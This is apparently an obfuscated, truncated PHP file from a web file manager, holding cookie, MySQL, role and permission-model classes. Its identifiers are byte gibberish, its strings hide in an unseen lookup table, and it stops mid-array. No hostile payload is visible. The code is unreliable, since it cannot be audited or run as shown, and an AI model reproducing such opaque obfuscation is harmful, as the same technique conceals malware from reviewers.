<?php
 goto F§—šŒ­¤ˆ; fãÙ‹×ø›: define($_SERVER[Ì¥ŞÒ°£][241], 1); define($_SERVER[Ì¥ŞÒ°£][242], 0); define($_SERVER[Ì¥ŞÒ°£][243], 2); goto AŞË—°á‚ğ; FØÍÈÕî”²: class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($ŠõäÑü‹ = '', $ùŠ˜²— = 0) { if (is_string($ŠõäÑü‹) && $ŠõäÑü‹ != $_SERVER[Ì¥ŞÒ°£][12]) { $this->prefix = $ŠõäÑü‹; } if (is_numeric($ùŠ˜²—) && $ùŠ˜²— > 0) { $this->expire = $ùŠ˜²—; } } public static function getInstance() { static $Á„¼Àş ; if ($Á„¼Àş  === null) { $Á„¼Àş  = new self(); } return $Á„¼Àş ; } private static $cookieDisable = false; public static function disable($Ç¶¸“ô£) { self::$cookieDisable = $Ç¶¸“ô£; } private static $sameCookieSet = array(); public static function set($‘±¹‡±ô, $ ÂÄ¹, $¨µÀ…¯ñ = 0, $úáúşŒ³ = false, $æŠ¼²ùÌ = false) { $½«›ù‡ =& $_SERVER[Ì¥ŞÒ°£]; if (self::$cookieDisable) { return; } if (!$¨µÀ…¯ñ) { $¨µÀ…¯ñ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$‘±¹‡±ô]) && self::$sameCookieSet[$‘±¹‡±ô] == $ ÂÄ¹ . $¨µÀ…¯ñ) { return; } self::$sameCookieSet[$‘±¹‡±ô] = $ ÂÄ¹ . $¨µÀ…¯ñ; if (!$æŠ¼²ùÌ) { $æŠ¼²ùÌ = str_replace(HOST, $½«›ù‡[12], APP_HOST); $æŠ¼²ùÌ = _get($GLOBALS, $½«›ù‡[885], $æŠ¼²ùÌ); } $ÜÃå® = $½«›ù‡[12]; setcookie($‘±¹‡±ô, $ ÂÄ¹, time() + $¨µÀ…¯ñ, $½«›ù‡[8] . trim($æŠ¼²ùÌ, $½«›ù‡[8]) . $ÜÃå®, !1, !1, $úáúşŒ³); } public static function setSafe($„Şè’ç¨, $““¡Â¼ï, $ŠÅ¿Ç—† = 0) { self::set($„Şè’ç¨, $““¡Â¼ï, $ŠÅ¿Ç—†, !0); } public static function get($É§µ³ŠÕ) { static $ù³Ÿã¸Ê = false; if (!$ù³Ÿã¸Ê) { self::initHeaderCookie(); $ù³Ÿã¸Ê = !0; } return isset($_COOKIE[$É§µ³ŠÕ]) ? $_COOKIE[$É§µ³ŠÕ] : !1; } private static function initHeaderCookie() { $¨ˆ°‰‘• =& $_SERVER[Ì¥ŞÒ°£]; if (!isset($_SERVER[$¨ˆ°‰‘•[886]]) || !$_SERVER[$¨ˆ°‰‘•[886]]) { return; } $æÑÏ‚“š = explode($¨ˆ°‰‘•[71], $_SERVER[$¨ˆ°‰‘•[886]]); foreach ($æÑÏ‚“š as $´Æ÷„Ú¿) { $´Æ÷„Ú¿ = explode($¨ˆ°‰‘•[887], $´Æ÷„Ú¿); if (count($´Æ÷„Ú¿) != 2 || !isset($´Æ÷„Ú¿[1])) { continue; } $_COOKIE[trim($´Æ÷„Ú¿[0])] = trim($´Æ÷„Ú¿[1]); } } public static function remove($ôˆ•ä¥, $Äñğï¥ª = false) { unset($_COOKIE[$ôˆ•ä¥]); self::set($ôˆ•ä¥, $_SERVER[Ì¥ŞÒ°£][12], 1, $Äñğï¥ª); } } class DbMysql extends Db { public function __construct($¡—¢†µ = '') { $’—²ùŠú =& $_SERVER[Ì¥ŞÒ°£]; if (!extension_loaded($’—²ùŠú[806])) { think_exception(think_lang($’—²ùŠú[14]) . $’—²ùŠú[888]); } if (!empty($¡—¢†µ)) { $this->config = $¡—¢†µ; if (empty($this->config[$’—²ùŠú[17]])) { $this->config[$’—²ùŠú[17]] = $’—²ùŠú[12]; } } } public function connect($Ïª¿ıà” = '', $¨ÂØÅáº = 0, $÷˜Õ§Èê = false) { $»€¡äËË =& $_SERVER[Ì¥ŞÒ°£]; if (!isset($this->linkID[$¨ÂØÅáº])) { if (empty($Ïª¿ıà”)) { $Ïª¿ıà” = $this->config; } $ïäü¶“½ = $Ïª¿ıà”[$»€¡äËË[889]] . ($Ïª¿ıà”[$»€¡äËË[890]] ? "\72{$Ïª¿ıà”[$»€¡äËË[890]]}" : $»€¡äËË[12]); $¨¾ºöˆõ = !empty($Ïª¿ıà”[$»€¡äËË[17]][$»€¡äËË[18]]) ? $Ïª¿ıà”[$»€¡äËË[17]][$»€¡äËË[18]] : $this->pconnect; if ($¨¾ºöˆõ) { $this->linkID[$¨ÂØÅáº] = mysql_pconnect($ïäü¶“½, $Ïª¿ıà”[$»€¡äËË[891]], $Ïª¿ıà”[$»€¡äËË[892]], 131072); } else { $this->linkID[$¨ÂØÅáº] = mysql_connect($ïäü¶“½, $Ïª¿ıà”[$»€¡äËË[891]], $Ïª¿ıà”[$»€¡äËË[892]], !0, 131072); } if (!$this->linkID[$¨ÂØÅáº] || !empty($Ïª¿ıà”[$»€¡äËË[21]]) && !mysql_select_db($Ïª¿ıà”[$»€¡äËË[21]], $this->linkID[$¨ÂØÅáº])) { think_exception(mysql_error()); } $ïÕÙşæµ = mysql_get_server_info($this->linkID[$¨ÂØÅáº]); mysql_query($»€¡äËË[893] . think_config($»€¡äËË[894]) . $»€¡äËË[58], $this->linkID[$¨ÂØÅáº]); if ($ïÕÙşæµ > $»€¡äËË[895]) { mysql_query($»€¡äËË[896], $this->linkID[$¨ÂØÅáº]); } $this->connected = !0; if (1 != think_config($»€¡äËË[22])) { unset($this->config); } } return $this->linkID[$¨ÂØÅáº]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($æÇ¹Ê°) { $½‘ìûø… =& $_SERVER[Ì¥ŞÒ°£]; if (0 === stripos($æÇ¹Ê°, $½‘ìûø…[264])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $æÇ¹Ê°; if ($this->queryID) { $this->free(); } think_action_status($½‘ìûø…[23], 1); think_status($½‘ìûø…[24]); $this->queryID = mysql_query($æÇ¹Ê°, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($á¨“õÚ±) { $ÚÅ ‚‘ß =& $_SERVER[Ì¥ŞÒ°£]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $á¨“õÚ±; if ($this->queryID) { $this->free(); } think_action_status($ÚÅ ‚‘ß[25], 1); think_status($ÚÅ ‚‘ß[24]); $Ó°Åã¬Ê = mysql_query($á¨“õÚ±, $this->_linkID); $this->debug(); if (!1 === $Ó°Åã¬Ê) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[Ì¥ŞÒ°£][897], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Ä’»Ç©É = mysql_query($_SERVER[Ì¥ŞÒ°£][898], $this->_linkID); $this->transTimes = 0; if (!$Ä’»Ç©É) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ŞıûÌ÷› = mysql_query($_SERVER[Ì¥ŞÒ°£][899], $this->_linkID); $this->transTimes = 0; if (!$ŞıûÌ÷›) { $this->error(); return !1; } } return !0; } private function getAll() { $·¹’£Œ¦ = array(); if ($this->numRows > 0) { while ($ú¼£øä¶ = mysql_fetch_assoc($this->queryID)) { $·¹’£Œ¦[] = $ú¼£øä¶; } mysql_data_seek($this->queryID, 0); } return $·¹’£Œ¦; } public function getFields($•ïßéÁ) { $·ßÃãö =& $_SERVER[Ì¥ŞÒ°£]; $­–š—¬¤ = $this->query($·ßÃãö[900] . $this->parseKey($•ïßéÁ)); $ç‘âƒ«Ã = array(); if ($­–š—¬¤) { foreach ($­–š—¬¤ as $¤‡¬òî => $âú¬´–Í) { $ç‘âƒ«Ã[$âú¬´–Í[$·ßÃãö[31]]] = array($·ßÃãö[32] => $âú¬´–Í[$·ßÃãö[31]], $·ßÃãö[33] => $âú¬´–Í[$·ßÃãö[34]], $·ßÃãö[35] => (bool) (strtoupper($âú¬´–Í[$·ßÃãö[36]]) === $·ßÃãö[901]), $·ßÃãö[37] => $âú¬´–Í[$·ßÃãö[38]], $·ßÃãö[39] => strtolower($âú¬´–Í[$·ßÃãö[40]]) == $·ßÃãö[41], $·ßÃãö[42] => strtolower($âú¬´–Í[$·ßÃãö[43]]) == $·ßÃãö[44]); } } return $ç‘âƒ«Ã; } public function getTables($ìÀÖÓ« = '') { $»³ŞŸ×­ =& $_SERVER[Ì¥ŞÒ°£]; if (!empty($ìÀÖÓ«)) { $îéƒÌĞ = $»³ŞŸ×­[902] . $ìÀÖÓ« . $»³ŞŸ×­[903]; } else { $îéƒÌĞ = $»³ŞŸ×­[904]; } $´¡˜É‰ª = $this->query($îéƒÌĞ); $’ÛáˆùÓ = array(); foreach ($´¡˜É‰ª as $“¤¿öÊø => $ØÔ´…Œô) { $’ÛáˆùÓ[$“¤¿öÊø] = current($ØÔ´…Œô); } return $’ÛáˆùÓ; } public function replace($°Æ‚è‡ã, $ÚŸ†Óöò = array()) { $Â¢áÏ¬ƒ =& $_SERVER[Ì¥ŞÒ°£]; foreach ($°Æ‚è‡ã as $ÊšãÌíÄ => $àïâô³) { $«·›÷»ï = $this->parseValue($àïâô³); if (is_scalar($«·›÷»ï)) { $ºãâ°Ğ¢[] = $«·›÷»ï; $Úıôé‚Ç[] = $this->parseKey($ÊšãÌíÄ); } } $öîéÁì™ = $Â¢áÏ¬ƒ[905] . $this->parseTable($ÚŸ†Óöò[$Â¢áÏ¬ƒ[279]]) . $Â¢áÏ¬ƒ[906] . implode($Â¢áÏ¬ƒ[50], $Úıôé‚Ç) . $Â¢áÏ¬ƒ[907] . implode($Â¢áÏ¬ƒ[50], $ºãâ°Ğ¢) . $Â¢áÏ¬ƒ[908]; return $this->execute($öîéÁì™); } public function insertAll($Êºİ®–ü, $™ô¡ù¶ = array(), $ªï‘±¤Ú = false) { $œŠ§õÜ =& $_SERVER[Ì¥ŞÒ°£]; if (!is_array($Êºİ®–ü[0])) { return !1; } $õˆç´Ä = array_keys($Êºİ®–ü[0]); $İ©Ó†¤Œ = array(); foreach ($Êºİ®–ü as $ÚËûÚì) { $¼ÒÖÌõ¿ = array(); foreach ($ÚËûÚì as $âÂ—òô” => $¨›šóïÈ) { $¨›šóïÈ = $this->parseValue($¨›šóïÈ); if (is_scalar($¨›šóïÈ)) { $¼ÒÖÌõ¿[] = $¨›šóïÈ; } } $İ©Ó†¤Œ[] = $œŠ§õÜ[260] . implode($œŠ§õÜ[50], $¼ÒÖÌõ¿) . $œŠ§õÜ[908]; } array_walk($õˆç´Ä, array($this, $œŠ§õÜ[909])); $¬ÑÙ×¥ = ($ªï‘±¤Ú ? $œŠ§õÜ[910] : $œŠ§õÜ[911]) . $œŠ§õÜ[912] . $this->parseTable($™ô¡ù¶[$œŠ§õÜ[279]]) . $œŠ§õÜ[906] . implode($œŠ§õÜ[50], $õˆç´Ä) . $œŠ§õÜ[913] . implode($œŠ§õÜ[50], $İ©Ó†¤Œ); return $this->execute($¬ÑÙ×¥); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $©ô¢¸ =& $_SERVER[Ì¥ŞÒ°£]; $this->error = mysql_errno() . $©ô¢¸[4] . mysql_error($this->_linkID); if ($©ô¢¸[12] != $this->queryStr) { $this->error .= LNG($©ô¢¸[48]) . $this->queryStr; } think_trace($this->error, $©ô¢¸[12], $©ô¢¸[49]); return $this->error; } public function escapeString($Êæ•ãª) { if ($this->_linkID) { return mysql_real_escape_string($Êæ•ãª, $this->_linkID); } else { return mysql_escape_string($Êæ•ãª); } } public function parseKey(&$†©±²Ší, $Óü¢ÌĞÛ = true) { $‰°æ¤´ =& $_SERVER[Ì¥ŞÒ°£]; if ($Óü¢ÌĞÛ) { $†©±²Ší = $this->parseKeyCheck($†©±²Ší); } if ($†©±²Ší != $‰°æ¤´[188] && !preg_match($‰°æ¤´[914], $†©±²Ší)) { $†©±²Ší = $‰°æ¤´[385] . trim($†©±²Ší, $‰°æ¤´[385]) . $‰°æ¤´[385]; } return $†©±²Ší; } } $_file = $_SERVER[$_SERVER[Ì¥ŞÒ°£][915]]; goto bÔù‹•çŸ†; D‚«µ‰ĞĞ: class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\171\x73\164\145\155\137\157\x70\164\x69\157\156"; protected $jsonField = array("\x6d\145\156\165", "\x72\x6f\154\x65", "\x72\x6f\x6c\x65\x47\162\x6f\x75\x70", "\162\x65\147\x69\x73\x74", "\x65\x6d\141\x69\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($¬¢“Ïü£) { return "\123\x79\x73\x74\x65\x6d\x4f\x70\x74\x69\x6f\x6e\137{$¬¢“Ïü£}"; } protected function optionDefault($¡£äâú– = '') { $ä’¿øô‰ =& $_SERVER[Ì¥ŞÒ°£]; if ($¡£äâú– == $ä’¿øô‰[12]) { return $GLOBALS[$ä’¿øô‰[6]][$ä’¿øô‰[381]]; } } } class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\145\x6d\56\162\x6f\154\145\114\x69\163\x74"; public $field = array("\156\141\x6d\x65", "\141\x75\164\x68", "\x6c\141\142\145\154", "\x64\x69\x73\x70\x6c\141\171", "\163\x79\x73\x74\145\x6d", "\144\x65\163\143", "\x69\x67\156\x6f\x72\x65\105\170\x74", "\x69\x67\156\x6f\x72\145\x46\x69\x6c\x65\x53\x69\x7a\x65", "\141\x64\x6d\151\156\x69\x73\164\162\x61\164\x6f\x72", "\x73\x6f\x72\164"); public function listData($İ¬ŠÑŠ = false, $ßßÛñ˜£ = "\x73\x6f\x72\164", $Ÿ§ÀÎ¾ò = false) { $úèó°ÔĞ =& $_SERVER[Ì¥ŞÒ°£]; $Œ·ëõĞë = parent::listData($İ¬ŠÑŠ, $ßßÛñ˜£, $Ÿ§ÀÎ¾ò); if (!$İ¬ŠÑŠ) { foreach ($Œ·ëõĞë as $´Á•ˆ× => $±íÊ‡²) { if ($±íÊ‡²[$úèó°ÔĞ[2055]] == 1) { $Œ·ëõĞë[$´Á•ˆ×][$úèó°ÔĞ[453]] = LNG($úèó°ÔĞ[2289]); } } } return $Œ·ëõĞë; } public function update($å­¹óˆ, $üÉ¡©Ó…) { $½ßÇ‘ìŸ =& $_SERVER[Ì¥ŞÒ°£]; $Èµ¦–ô‹ = parent::listData($å­¹óˆ); $ü·ùòÆÀ = $this->findByName($üÉ¡©Ó…[$½ßÇ‘ìŸ[32]]); if (!$Èµ¦–ô‹ || $ü·ùòÆÀ && $ü·ùòÆÀ[$½ßÇ‘ìŸ[399]] != $Èµ¦–ô‹[$½ßÇ‘ìŸ[399]]) { return !1; } if ($ü·ùòÆÀ[$½ßÇ‘ìŸ[2055]] == 1) { $üÉ¡©Ó… = array($½ßÇ‘ìŸ[32] => $üÉ¡©Ó…[$½ßÇ‘ìŸ[32]], $½ßÇ‘ìŸ[1880] => $üÉ¡©Ó…[$½ßÇ‘ìŸ[1880]]); } $this->filterAuth($üÉ¡©Ó…[$½ßÇ‘ìŸ[413]]); return parent::update($å­¹óˆ, $üÉ¡©Ó…); } public function remove($¨×±×»–) { $ñ¿÷éæ˜ = parent::listData($¨×±×»–); if (!$ñ¿÷éæ˜ || $ñ¿÷éæ˜[$_SERVER[Ì¥ŞÒ°£][1290]]) { return !1; } return parent::remove($¨×±×»–); } public function add($Å®Ñ‚¤é) { $Î‡ºÙº¦ =& $_SERVER[Ì¥ŞÒ°£]; $Ë’Œ”ÎŠ = $Å®Ñ‚¤é[$Î‡ºÙº¦[32]]; if ($this->findByName($Ë’Œ”ÎŠ)) { return !1; } $ñ”âƒˆ = array($Î‡ºÙº¦[420] => $Ë’Œ”ÎŠ, $Î‡ºÙº¦[1863] => $Î‡ºÙº¦[12], $Î‡ºÙº¦[1859] => $Î‡ºÙº¦[1867], $Î‡ºÙº¦[2290] => 1, $Î‡ºÙº¦[1862] => 0, $Î‡ºÙº¦[2291] => 0, $Î‡ºÙº¦[1861] => $this->getSort()); $Å®Ñ‚¤é = array_merge($ñ”âƒˆ, $Å®Ñ‚¤é); $this->filterAuth($Å®Ñ‚¤é[$Î‡ºÙº¦[413]]); return parent::insert($Å®Ñ‚¤é); } private function getSort() { $èö¼ä—İ =& $_SERVER[Ì¥ŞÒ°£]; $¹ÛÜ‘±© = parent::listData(); $£ªÑ”îã = array_to_keyvalue($¹ÛÜ‘±©, $èö¼ä—İ[12], $èö¼ä—İ[1881]); return empty($£ªÑ”îã) ? 0 : max($£ªÑ”îã) + 1; } private function filterAuth(&$ûµ€³‡¿) { $òÊÊí«Ø =& $_SERVER[Ì¥ŞÒ°£]; $ò¿ÎˆÃÁ = array(); $èÒŠÌö¦ = array_filter(explode($òÊÊí«Ø[50], $ûµ€³‡¿)); foreach ($èÒŠÌö¦ as $ûµ€³‡¿) { $Ú–¿ğòË = explode($òÊÊí«Ø[10], $ûµ€³‡¿); if ($Ú–¿ğòË[0] == $òÊÊí«Ø[2292] && $Ú–¿ğòË[1] != $òÊÊí«Ø[1196]) { $Îºéê½½ = $Ú–¿ğòË[0] . $òÊÊí«Ø[10] . $Ú–¿ğòË[1] . $òÊÊí«Ø[2293]; if (!in_array($Îºéê½½, $èÒŠÌö¦)) { $ò¿ÎˆÃÁ[] = $Îºéê½½; } } $ò¿ÎˆÃÁ[] = $ûµ€³‡¿; } $ûµ€³‡¿ = implode($òÊÊí«Ø[50], $ò¿ÎˆÃÁ); } public function findRoleDefault() { $ƒàÚÌïÍ =& $_SERVER[Ì¥ŞÒ°£]; $Ü´ñíéŠ = parent::listData(); $ÊáØŞÆŸ = !1; foreach ($Ü´ñíéŠ as $®Ñ¹öæÌ) { if (!$®Ñ¹öæÌ || $®Ñ¹öæÌ[$ƒàÚÌïÍ[1879]] == $ƒàÚÌïÍ[197] || $®Ñ¹öæÌ[$ƒàÚÌïÍ[2055]] == 1) { continue; } if (strstr($®Ñ¹öæÌ[$ƒàÚÌïÍ[413]], $ƒàÚÌïÍ[2294])) { continue; } if (!strstr($®Ñ¹öæÌ[$ƒàÚÌïÍ[413]], $ƒàÚÌïÍ[2295])) { continue; } if (!$ÊáØŞÆŸ) { $ÊáØŞÆŸ = $®Ñ¹öæÌ; continue; } $Ã®…—›„ = explode($ƒàÚÌïÍ[50], $ÊáØŞÆŸ[$ƒàÚÌïÍ[413]]); $¶ËÂ¼¦Ü = explode($ƒàÚÌïÍ[50], $®Ñ¹öæÌ[$ƒàÚÌïÍ[413]]); if (count($Ã®…—›„) > count($¶ËÂ¼¦Ü)) { $ÊáØŞÆŸ = $®Ñ¹öæÌ; } } return $ÊáØŞÆŸ ? $ÊáØŞÆŸ[$ƒàÚÌïÍ[399]] : $ƒàÚÌïÍ[12]; } public function sort($·ü¦ªøÎ, $¢™ÔØ¢¹) { return parent::update($·ü¦ªøÎ, $¢™ÔØ¢¹); } } goto aÜ’˜Ù§”; E¢‹Öøî‹: class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $Ğ¾Ã¨¡Ò =& $_SERVER[Ì¥ŞÒ°£]; $¦÷ú¦Ğú = array(array($Ğ¾Ã¨¡Ò[420] => LNG($Ğ¾Ã¨¡Ò[1858]), $Ğ¾Ã¨¡Ò[1859] => $Ğ¾Ã¨¡Ò[1860], $Ğ¾Ã¨¡Ò[1861] => 1, $Ğ¾Ã¨¡Ò[1862] => 1, $Ğ¾Ã¨¡Ò[1863] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($Ğ¾Ã¨¡Ò[420] => LNG($Ğ¾Ã¨¡Ò[1864]), $Ğ¾Ã¨¡Ò[1859] => $Ğ¾Ã¨¡Ò[1865], $Ğ¾Ã¨¡Ò[1861] => 2, $Ğ¾Ã¨¡Ò[1862] => 1, $Ğ¾Ã¨¡Ò[1863] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($Ğ¾Ã¨¡Ò[420] => LNG($Ğ¾Ã¨¡Ò[1866]), $Ğ¾Ã¨¡Ò[1859] => $Ğ¾Ã¨¡Ò[1867], $Ğ¾Ã¨¡Ò[1861] => 3, $Ğ¾Ã¨¡Ò[1862] => 1, $Ğ¾Ã¨¡Ò[1863] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($Ğ¾Ã¨¡Ò[420] => LNG($Ğ¾Ã¨¡Ò[1868]), $Ğ¾Ã¨¡Ò[1859] => $Ğ¾Ã¨¡Ò[1869], $Ğ¾Ã¨¡Ò[1861] => 4, $Ğ¾Ã¨¡Ò[1862] => 1, $Ğ¾Ã¨¡Ò[1863] => self::AUTH_SHOW | self::AUTH_VIEW), array($Ğ¾Ã¨¡Ò[420] => LNG($Ğ¾Ã¨¡Ò[1870]), $Ğ¾Ã¨¡Ò[1859] => $Ğ¾Ã¨¡Ò[1871], $Ğ¾Ã¨¡Ò[1861] => 5, $Ğ¾Ã¨¡Ò[1862] => 1, $Ğ¾Ã¨¡Ò[1863] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($Ğ¾Ã¨¡Ò[420] => LNG($Ğ¾Ã¨¡Ò[1872]), $Ğ¾Ã¨¡Ò[1859] => $Ğ¾Ã¨¡Ò[1873], $Ğ¾Ã¨¡Ò[1861] => 6, $Ğ¾Ã¨¡Ò[1862] => 1, $Ğ¾Ã¨¡Ò[1863] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($Ğ¾Ã¨¡Ò[420] => LNG($Ğ¾Ã¨¡Ò[1874]), $Ğ¾Ã¨¡Ò[1859] => $Ğ¾Ã¨¡Ò[1875], $Ğ¾Ã¨¡Ò[1861] => 7, $Ğ¾Ã¨¡Ò[1862] => 1, $Ğ¾Ã¨¡Ò[1863] => 0)); return $¦÷ú¦Ğú; } public static function authCheck($ÈË–£è, $çÇ„ô‡) { $Ã¦Â‰ =& $_SERVER[Ì¥ŞÒ°£]; $ÈË–£è = intval($ÈË–£è); if ($GLOBALS[$Ã¦Â‰[503]] && $GLOBALS[$Ã¦Â‰[6]][$Ã¦Â‰[1876]]) { return !0; } if ($ÈË–£è <= 0) { return !1; } if (($ÈË–£è & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($ÈË–£è & $çÇ„ô‡); } public static function authCheckShow($µÜÌºêÑ) { return self::authCheck($µÜÌºêÑ, self::AUTH_SHOW); } public static function authCheckView($œ‰ı¤İˆ) { return self::authCheck($œ‰ı¤İˆ, self::AUTH_VIEW); } public static function authCheckDownload($‡„Åûø) { return self::authCheck($‡„Åûø, self::AUTH_DOWNLOAD); } public static function authCheckUpload($Ø³«İÈå) { return self::authCheck($Ø³«İÈå, self::AUTH_UPLOAD); } public static function authCheckEdit($¸îİúÑà) { return self::authCheck($¸îİúÑà, self::AUTH_EDIT); } public static function authCheckRemove($÷¼¾íŠ») { return self::authCheck($÷¼¾íŠ», self::AUTH_REMOVE); } public static function authCheckShare($Ù’Ä‹İ¸) { return self::authCheck($Ù’Ä‹İ¸, self::AUTH_SHARE); } public static function authCheckComment($ËƒÁØÅ) { return self::authCheck($ËƒÁØÅ, self::AUTH_COMMENT); } public static function authCheckEvent($§Ó€•“ê) { return self::authCheck($§Ó€•“ê, self::AUTH_EVENT); } public static function authCheckRoot($„ŸöÊğü) { return self::authCheck($„ŸöÊğü, self::AUTH_ROOT); } public static function authCheckAction($×ê±›±‡, $»œÔ’ªà) { $ƒ‚¸üÄ® =& $_SERVER[Ì¥ŞÒ°£]; $Ñ™Í×£× = array($ƒ‚¸üÄ®[1877] => self::AUTH_VIEW, $ƒ‚¸üÄ®[1200] => self::AUTH_DOWNLOAD, $ƒ‚¸üÄ®[107] => self::AUTH_UPLOAD, $ƒ‚¸üÄ®[1827] => self::AUTH_EDIT, $ƒ‚¸üÄ®[1826] => self::AUTH_REMOVE, $ƒ‚¸üÄ®[1837] => self::AUTH_SHARE, $ƒ‚¸üÄ®[354] => self::AUTH_COMMENT, $ƒ‚¸üÄ®[1655] => self::AUTH_EVENT, $ƒ‚¸üÄ®[1878] => self::AUTH_ROOT); if (!isset($Ñ™Í×£×[$»œÔ’ªà])) { return; } $Ø…µ´×À = $Ñ™Í×£×[$»œÔ’ªà]; $×ê±›±‡ = intval($×ê±›±‡); if ($×ê±›±‡ <= 0) { return !1; } if (($×ê±›±‡ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($×ê±›±‡ & $Ø…µ´×À); } public static function authDisable($ú¯ı¶ò, $šø êÆ») { if (intval($ú¯ı¶ò) <= 0) { return 0; } return intval($ú¯ı¶ò) & ~$šø êÆ»; } public $optionType = "\123\x79\163\164\145\x6d\x2e\163\157\x75\x72\x63\x65\x41\x75\164\150\114\151\x73\x74"; public $field = array("\x6e\141\x6d\145", "\x61\x75\164\x68", "\x6c\x61\x62\145\154", "\144\x69\x73\x70\154\141\171", "\x73\x79\163\164\145\155", "\163\x6f\162\164"); public function initData() { $‡¿ÛşÆÎ = $this->authDefault(); foreach ($‡¿ÛşÆÎ as $ÛæÚá°’) { $this->add($ÛæÚá°’); } } public function findAuth($€¤Ö¢÷£, $ùèûşê”) { $ô•­Øî =& $_SERVER[Ì¥ŞÒ°£]; $†»ŒĞÈ¹ = parent::listData(); foreach ($†»ŒĞÈ¹ as $ÎÓ¤Àãè) { $¤ÃË·»µ = intval($ÎÓ¤Àãè[$ô•­Øî[413]]); if ($¤ÃË·»µ <= 0 || $ÎÓ¤Àãè[$ô•­Øî[1879]] == 0) { continue; } if (($¤ÃË·»µ & $€¤Ö¢÷£) != $€¤Ö¢÷£) { continue; } if (($¤ÃË·»µ & $ùèûşê”) != 0) { continue; } return $ÎÓ¤Àãè[$ô•­Øî[399]]; } return !1; } public function findAuthReadOnly() { $ª·ì»½Ç = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $Õ†éÉ¦ = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($ª·ì»½Ç, $Õ†éÉ¦); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $ÓÖ€¹ëâ =& $_SERVER[Ì¥ŞÒ°£]; $Éğª¯§ = parent::listData(); $‹§øÖÂ = !1; foreach ($Éğª¯§ as $µæ«ëš) { if ($µæ«ëš[$ÓÖ€¹ëâ[413]] <= 0 || $µæ«ëš[$ÓÖ€¹ëâ[1879]] == $ÓÖ€¹ëâ[197]) { continue; } if (!$‹§øÖÂ) { $‹§øÖÂ = $µæ«ëš; continue; } if ($‹§øÖÂ[$ÓÖ€¹ëâ[413]] > $µæ«ëš[$ÓÖ€¹ëâ[413]]) { $‹§øÖÂ = $µæ«ëš; } } return $‹§øÖÂ ? $‹§øÖÂ[$ÓÖ€¹ëâ[399]] : $ÓÖ€¹ëâ[12]; } public function listData($Ì´šÌğ = false, $·Ú›…‹à = "\x73\157\x72\164", $´øñä‹• = false) { return parent::listData($Ì´šÌğ, $·Ú›…‹à, $´øñä‹•); } public function update($ÂµÚÆ…È, $€àô……ï) { $øØç„ÓÉ =& $_SERVER[Ì¥ŞÒ°£]; $•äåÙğ = parent::listData($ÂµÚÆ…È); $Ä¿¸®Î = $this->findByName($€àô……ï[$øØç„ÓÉ[32]]); if (!$•äåÙğ || $Ä¿¸®Î && $Ä¿¸®Î[$øØç„ÓÉ[399]] != $•äåÙğ[$øØç„ÓÉ[399]]) { return !1; } $this->filterAuth($€àô……ï[$øØç„ÓÉ[413]]); return parent::update($ÂµÚÆ…È, $€àô……ï); } public function remove($¸“Âƒ¥Ô) { $ÆÊµÀ ¨ = parent::listData($¸“Âƒ¥Ô); if (!$ÆÊµÀ ¨ || $ÆÊµÀ ¨[$_SERVER[Ì¥ŞÒ°£][1290]]) { return !1; } return parent::remove($¸“Âƒ¥Ô); } public function add($‚µŞãíÑ = array()) { $ŠçŸïÚÃ =& $_SERVER[Ì¥ŞÒ°£]; if ($this->findByName($‚µŞãíÑ[$ŠçŸïÚÃ[32]])) { return !1; } $Ü‰ƒµÌÕ = array($ŠçŸïÚÃ[32] => $ŠçŸïÚÃ[12], $ŠçŸïÚÃ[413] => 1, $ŠçŸïÚÃ[1880] => $ŠçŸïÚÃ[1867], $ŠçŸïÚÃ[1879] => 1, $ŠçŸïÚÃ[1290] => 0, 